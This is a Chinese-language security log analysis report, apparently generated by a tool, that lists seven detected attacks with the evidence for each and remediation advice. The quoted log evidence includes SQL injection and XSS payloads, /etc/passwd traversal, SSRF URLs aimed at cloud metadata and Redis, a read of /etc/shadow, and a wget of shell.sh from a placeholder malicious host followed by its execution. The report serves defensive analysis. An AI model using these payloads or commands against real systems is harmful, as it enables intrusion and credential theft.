# 安全日志分析报告

## 概述
分析 60 条日志，发现 7 个安全问题。涉及多种攻击手法，建议立即处置。

## 日志概览
- 日志条目数: 60
- 时间范围: 2024-01-15T10:00:00+00:00 ~ 2026-01-15T10:06:00
- 日志级别分布: WARN=32, INFO=19, ERROR=6, CRITICAL=3
- Top 来源 IP: 10.0.0.12(11), 10.0.0.99(10), 10.0.0.66(8), 10.0.0.55(5), 10.0.0.77(4)
- 错误/告警条目: 9 条

## 发现漏洞 (7)

### 🔴 VULN-001 - SQL 注入尝试
- **严重性**: CRITICAL
- **置信度**: 95%
- **描述**: 检测到 SQL 注入攻击特征，攻击者尝试通过 UNION SELECT / OR 1=1 / DROP TABLE 等 payload 篡改数据库查询。
- **来源 IP**: 10.0.0.66
- **受影响路径**: /products, /products?id=1, /products?id=1;
- **证据**:
  - [2024-01-15T10:01:09+00:00] 10.0.0.66 | Potential SQL injection: DROP TABLE detected
  - [2024-01-15T10:01:06+00:00] 10.0.0.66 | SQL syntax error near 'UNION SELECT * FROM users--'
  - [2024-01-15T10:01:08+00:00] 10.0.0.66 | GET /products?id=1; 500
  - [2024-01-15T10:01:05+00:00] 10.0.0.66 | GET /products?id=1 500
- **建议**: 使用参数化查询（PreparedStatement），部署 WAF 规则拦截 SQL 注入 payload，对 /products 接口增加输入校验。

### 🟠 VULN-002 - XSS 跨站脚本攻击
- **严重性**: HIGH
- **置信度**: 85%
- **描述**: 检测到 XSS 攻击 payload，攻击者尝试注入恶意 JavaScript 脚本。
- **来源 IP**: 10.0.0.23
- **受影响路径**: /search?q=<img, /search?q=<script>alert('xss')</script>
- **证据**:
  - [2024-01-15T10:02:05+00:00] 10.0.0.23 | GET /search?q=<img 200
  - [2024-01-15T10:02:00+00:00] 10.0.0.23 | GET /search?q=<script>alert('xss')</script> 200
- **建议**: 对所有用户输入进行 HTML 实体编码，设置 Content-Security-Policy 头，启用浏览器 XSS 过滤器。

### 🟠 VULN-003 - 路径遍历攻击
- **严重性**: HIGH
- **置信度**: 90%
- **描述**: 检测到路径遍历攻击，攻击者尝试访问系统敏感文件（/etc/passwd、win.ini）。
- **来源 IP**: 10.0.0.77
- **受影响路径**: /%2e%2e/%2e%2e/etc/passwd, /../../etc/passwd
- **证据**:
  - [2024-01-15T10:03:01+00:00] 10.0.0.77 | Path traversal attempt: ../../etc/passwd
  - [2024-01-15T10:03:02+00:00] 10.0.0.77 | GET /%2e%2e/%2e%2e/etc/passwd 403
  - [2024-01-15T10:03:00+00:00] 10.0.0.77 | GET /../../etc/passwd 403
- **建议**: 对文件路径做规范化处理，限制文件访问根目录，拒绝包含 ../ 的请求。

### 🟠 VULN-004 - 暴力破解攻击
- **严重性**: HIGH
- **置信度**: 88%
- **描述**: 检测到暴力破解行为，同一 IP 短时间内多次登录失败后成功，疑似密码爆破。
- **来源 IP**: 10.0.0.99
- **受影响路径**: /login
- **证据**:
  - [2024-01-15T10:04:07+00:00] 10.0.0.99 | POST /login 401
  - [2024-01-15T10:04:06+00:00] 10.0.0.99 | POST /login 401
  - [2024-01-15T10:04:05+00:00] 10.0.0.99 | POST /login 401
  - [2024-01-15T10:04:04+00:00] 10.0.0.99 | POST /login 401
  - [2024-01-15T10:04:03+00:00] 10.0.0.99 | POST /login 401
- **建议**: 增加登录失败锁定策略（如 5 次失败锁定 30 分钟），启用双因素认证，设置登录速率限制。

### 🟡 VULN-005 - 目录扫描探测
- **严重性**: MEDIUM
- **置信度**: 80%
- **描述**: 检测到目录扫描行为，攻击者使用 nmap 探测敏感路径（.env、.git/config、wp-admin 等）。
- **来源 IP**: 10.0.0.12
- **受影响路径**: /.env, /.git/config, /admin, /backup.sql, /cgi-bin/, /config.php, /node_modules/, /phpmyadmin, /shell.php, /vendor/, /wp-admin
- **证据**:
  - [2024-01-15T10:05:10+00:00] 10.0.0.12 | GET /node_modules/ 404
  - [2024-01-15T10:05:09+00:00] 10.0.0.12 | GET /vendor/ 404
  - [2024-01-15T10:05:08+00:00] 10.0.0.12 | GET /cgi-bin/ 404
  - [2024-01-15T10:05:07+00:00] 10.0.0.12 | GET /shell.php 404
  - [2024-01-15T10:05:06+00:00] 10.0.0.12 | GET /backup.sql 404
- **建议**: 配置 WAF 拦截扫描器 User-Agent，禁止访问隐藏文件（.env、.git），返回统一的 404 页面。

### 🔴 VULN-006 - SSRF 服务端请求伪造
- **严重性**: CRITICAL
- **置信度**: 92%
- **描述**: 检测到 SSRF 攻击，攻击者通过代理接口访问云元数据端点和内部服务（Redis）。
- **来源 IP**: 10.0.0.55
- **受影响路径**: /api/proxy, /api/proxy?url=http://169.254.169.254/latest/meta-data/, /api/proxy?url=http://localhost:6379/
- **证据**:
  - [2024-01-15T10:06:11+00:00] 10.0.0.55 | SSRF attempt: request to internal service localhost:6379 (Redis)
  - [2024-01-15T10:06:06+00:00] 10.0.0.55 | SSRF attempt: request to cloud metadata endpoint 169.254.169.254
  - [2024-01-15T10:06:10+00:00] 10.0.0.55 | GET /api/proxy?url=http://localhost:6379/ 200
  - [2024-01-15T10:06:05+00:00] 10.0.0.55 | GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ 200
- **建议**: 对出站请求做 URL 白名单校验，禁止访问 169.254.169.254 和内网地址段，移除 /api/proxy 的 url 参数。

### 🔴 VULN-007 - 权限提升
- **严重性**: CRITICAL
- **置信度**: 87%
- **描述**: 检测到权限提升行为，攻击者在 SSH 登录后通过 sudo 执行高危命令（读取 shadow、下载并执行脚本）。
- **证据**:
  - [2026-01-15T10:05:50]  | root : TTY=pts/0 ; PWD=/root ; COMMAND=/bin/bash shell.sh
  - [2026-01-15T10:05:45]  | root : TTY=pts/0 ; PWD=/root ; COMMAND=/usr/bin/wget http://malicious.example.com/shell.sh
  - [2026-01-15T10:05:40]  | root : TTY=pts/0 ; PWD=/root ; COMMAND=/usr/bin/cat /etc/shadow
- **建议**: 限制 sudo 权限，禁止 root 远程登录，部署 HIDS 监控高危命令执行，审计 cron 任务。

## 攻击链 (3)

### 攻击链 #1 — 10.0.0.12
1. 步骤1: [2024-01-15T10:05:00+00:00] GET /admin 404
2. 步骤2: [2024-01-15T10:05:01+00:00] GET /.env 404
3. 步骤3: [2024-01-15T10:05:02+00:00] GET /.git/config 404
4. 步骤4: [2024-01-15T10:05:03+00:00] GET /wp-admin 404
5. 步骤5: [2024-01-15T10:05:04+00:00] GET /phpmyadmin 404
6. 步骤6: [2024-01-15T10:05:05+00:00] GET /config.php 404
7. 步骤7: [2024-01-15T10:05:06+00:00] GET /backup.sql 404
8. 步骤8: [2024-01-15T10:05:07+00:00] GET /shell.php 404
9. 步骤9: [2024-01-15T10:05:08+00:00] GET /cgi-bin/ 404
10. 步骤10: [2024-01-15T10:05:09+00:00] GET /vendor/ 404
- **评估**: 该 IP 触发了: 目录扫描探测

### 攻击链 #2 — 10.0.0.23
1. 步骤1: [2024-01-15T10:02:00+00:00] GET /search?q=<script>alert('xss')</script> 200
2. 步骤2: [2024-01-15T10:02:05+00:00] GET /search?q=<img 200
- **评估**: 该 IP 触发了: XSS 跨站脚本攻击

### 攻击链 #3 — 10.0.0.55
1. 步骤1: [2024-01-15T10:06:00+00:00] GET /api/internal/metadata 200
2. 步骤2: [2024-01-15T10:06:05+00:00] GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ 200
3. 步骤3: [2024-01-15T10:06:10+00:00] GET /api/proxy?url=http://localhost:6379/ 200
4. 步骤4: [2024-01-15T10:06:06+00:00] SSRF attempt: request to cloud metadata endpoint 169.254.169.254
5. 步骤5: [2024-01-15T10:06:11+00:00] SSRF attempt: request to internal service localhost:6379 (Redis)
- **评估**: 该 IP 触发了: SSRF 服务端请求伪造

## 统计
- 总发现数: 7
- 按严重性: CRITICAL: 3, HIGH: 3, MEDIUM: 1

## 分析过程
- 总耗时: 7ms
- 总步数: 29
- 工具调用次数: 14
